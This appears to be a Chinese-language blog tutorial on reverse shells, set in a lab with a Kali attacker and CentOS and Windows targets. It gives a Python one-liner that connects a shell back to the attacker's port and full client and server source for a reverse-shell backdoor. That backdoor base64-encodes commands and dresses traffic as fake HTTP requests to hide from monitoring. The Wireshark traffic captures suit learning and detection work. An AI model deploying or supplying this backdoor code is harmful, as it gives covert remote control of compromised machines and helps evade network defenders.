## **0X00 What Is Reverse Shell**

reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

## **0X01 Why I Need Reverse Shell**

通常用于被控端因防火墙受限、权限不足、端口被占用等情形

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2.它的ip会动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。

那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

## **0X02 The Essence Of Reverse Shell**

我们可以先以一个linux 下最常见的bash反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。

## Environment

攻击机 Kali  192.168.40.128

靶机A Windows10 192.168.40.1

靶机B Centos7  192.168.40.129

------

## Reverse Shell By Bash

假设当前已拿下靶机B权限已安装nc

在攻击机 Kali内开启监听2333端口

![image-20191217211930713](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217211930713.png)

靶机通过bash反弹shell至攻击机2333端口

![image-20191217212138226](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217212138226.png)

> 相关解释

- `bash -i` 表示产生一个交互式的shell
- `dev/tcp/host/port` 这个文件非常特殊,可以理解为一个设备.如果host 是一个合法的主机名或internet地址,并且port是一个整数端口号或服务名,bash试图建立与相应的socket(套接字)的TCP连接.

攻击机成功建立连接

![image-20191217212221956](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217212221956.png)

执行ls命令查看靶机B当前目录文件

![image-20191217212347985](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217212347985.png)

shell成功返回内容

在执行命令的同时打开流量监测工具wireshark查看流量情况

![image-20191217212756841](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217212756841.png)

![image-20191217224730605](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217224730605.png)

可以看到整个过程都在同一个TCP连接中并且传输内容以明文方式传输

## Reverse Shell By Script of python

攻击机Kali内执行nc -lvp 2333 监听2333端口等待建立socket连接

![image-20191217223931495](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217223931495.png)

靶机B Centos7内执行简单的socket脚本与攻击机建立套接字连接

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.40.128",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image-20191217224057537](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217224057537.png)

成功建立连接后我们打开wireshark监听流量并执行ls命令查看流量情况

![image-20191217224224070](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217224224070.png)

![image-20191217224238012](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217224238012.png)

![image-20191217224259448](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217224259448.png)

可以看到整个过程与上面bash反弹shell一样同样是TCP建立的socket套接字连接内容同样为明文传输。当然实现方式有很多还可以自行进行socket套接字变成查看或者将本文末尾的脚本伪http部分以及code decode去掉 查看。追踪TCP流可以看到整个过程的流量内容都是以明文进行传输的。

## Reverse Shell By Encryption Script of python

攻击机 Kali运行server监听等待建立连接  演示端口为1234

![image-20191217213736917](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217213736917.png)

靶机A Windows10 运行client 与攻击机在1234端口建立socket连接

![image-20191217214513156](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217214513156.png)

可以看到已成功与攻击机建立连接

![image-20191217214541766](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217214541766.png)

开启wireshark监听流量并执行Windows dos 命令

攻击机输入calc打开靶机的系统计算器

可以看到整个过程建立了两个HTTP连接两个TCP连接

![image-20191217215206553](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217215206553.png)

并成功打开了靶机的计算器

![image-20191217214931320](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217214931320.png)



追踪TCP流以及HTTP流可以看到内容一样

![image-20191217215527442](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217215527442.png)

![image-20191217215549185](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217215549185.png)

于流量中可以看到Y2FsYw==是base64加密后的内容

base64解密后即可看到刚刚执行的命令calc

![image-20191217215747147](C:\Users\32168\AppData\Roaming\Typora\typora-user-images\image-20191217215747147.png)

于此整个过程复现结束

------

## Encryption Script of python

> client.py

```python
import base64
import argparse
import socket
import subprocess
import sys
import time

def connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,int(port)))
    while True:
        data = s.recv(4096)
        try:
            data = decryption_req(data).decode()
            comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            m_stdout, m_stderr = comRst.communicate()
            rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
            s.send(encryption_req(rst))
        except Exception as e:
            s.send(encryption_req(str(e).encode()))

        time.sleep(1)
    s.close()

# 加密
def encryption_req(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()

    sendData = "POST /secgeeker"
    sendData += "\r\n"
    sendData += "HTTP/1.1"
    sendData += "\r\n"
    sendData += "Host: bbs.secgeeker.net"
    sendData += "\r\n"
    sendData += "Connection: close"
    sendData += "\r\n"
    sendData += "Upgrade-Insecure-Requests: 1"
    sendData += "\r\n"
    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
    sendData += "\r\n"
    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    sendData += "\r\n"
    sendData += "Accept-Language: en-US,en;q=0.9"
    sendData += "\r\n"
    sendData += "Accept-Encoding: gzip, deflate"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "stri0date=%s" % data
    sendData += "\r\n"
    sendData += "\r\n"
    return sendData.encode()

# 解密
def decryption_req(data):
    data = data.decode()
    data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()

    # 解码/解密
    result = str(base64.b64decode(result), "utf-8")

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host',dest='hostName',help='主机地址 例如：h88z真帅！110.110.110.110')
    parser.add_argument('-port',dest='conPort',help='端口地址 例如：楼上说的对！1234')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    connection(host, port)
```

> server.py

```python
import base64
import socket
import argparse
import time

def connection(s):
    print('Waiting for connection......')
    ss, addr = s.accept()
    print('client %s is connection!' % (addr[0]))
    print('print:\\!q for Disconnect')
    while True:
        cmd = input(str(addr[0]) + ':~#')
        if cmd == '\\!q':
            print('-- Disconnected --')
            exit(0)
        ss.send(encryption_res(cmd.encode()))
        data = ss.recv(4096)
        print(decryption_req(data).decode())

def encryption_res(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()
    # 对时间进行处理
    date = time.strftime('%a, %d %b %Y %X GMT', time.localtime(time.time()))

    sendData = "HTTP/1.1 200 OK"
    sendData += "\r\n"
    sendData += "Date: %s" % date
    sendData += "\r\n"
    sendData += "Content-Type: application/x-javascript"
    sendData += "\r\n"
    sendData += "Content-Length: %d" % len(data)
    sendData += "\r\n"
    sendData += "Connection: keep-alive"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "%s" % data
    return sendData.encode()

def decryption_req(data):
    data = data.decode()
    data = data[data.find("\r\n\r\nstri0date=") + 14:]
    data = data[:data.find("\r\n\r\n")]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='hostName', default='0.0.0.0', help='Host Name(default=0.0.0.0)')
    parser.add_argument('-port', dest='conPort', default=1234,help='Host Port(default=1234)')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host,port))
    s.listen(512)
    connection(s)
```

